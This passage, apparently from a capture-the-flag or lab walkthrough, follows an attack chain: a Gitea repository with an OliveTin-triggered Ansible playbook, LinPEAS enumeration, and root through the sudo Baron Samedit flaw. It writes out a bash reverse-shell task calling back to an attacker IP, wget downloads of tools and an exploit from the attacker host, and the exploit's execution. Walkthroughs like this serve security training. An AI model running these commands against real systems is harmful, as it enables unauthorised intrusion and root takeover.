2. Gitea & Infrastructure as Code (IaC) Exploitation
Logging into Gitea, I found a repository used for server management. The OliveTin configuration revealed that the "Run Ansible Playbook" button was hardcoded to execute:
git -C /root/ansible pull && ansible-playbook /root/ansible/playbook.yaml

The Reverse Shell Attempt
I attempted to gain a root shell by modifying the playbook.yaml file within the Gitea web interface. I added a task to execute a bash reverse shell back to my Kali machine:

YAML
- name: Exploit
  hosts: localhost
  tasks:
    - name: Reverse Shell
      shell: bash -i >& /dev/tcp/192.168.148.149/4444 0>&1

  flag2: 5e2cafbbf180351702651c09cd797920
3. Local Enumeration with LinPEAS
To identify the path to root, I transferred LinPEAS from my Kali machine:

Bash
# On Kali
python3 -m http.server 80

# On Target
wget http://[KALI_IP]/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
Key LinPEAS Findings:
OliveTin Config: LinPEAS flagged /etc/OliveTin/config.yaml, which revealed that the "Run Ansible Playbook" button executed a git pull followed by ansible-playbook as root.

Vulnerable Sudo: The sudo version was flagged as vulnerable to CVE-2021-3156 (Baron Samedit).

Network Restrictions: LinPEAS confirmed the machine had no outbound internet access, explaining why the Gitea/Ansible "intended" path was failing (it couldn't pull the updated repo).

4. Privilege Escalation: Baron Samedit
Since the Ansible/OliveTin loop was broken by the network firewall, I pivoted to the sudo vulnerability discovered by LinPEAS.

Exploit Strategy:
Transfer: I hosted the Python-based NSS exploit (exploit_nss.py) on my Kali machine.

Download: On the target, I fetched the exploit:

Bash
wget http://[KALI_IP]/exploit_nss.py
Execution: I ran the exploit using Python 3:

Bash
python3 exploit_nss.py
The exploit successfully triggered a heap overflow in sudoedit, dropping me into a root shell.

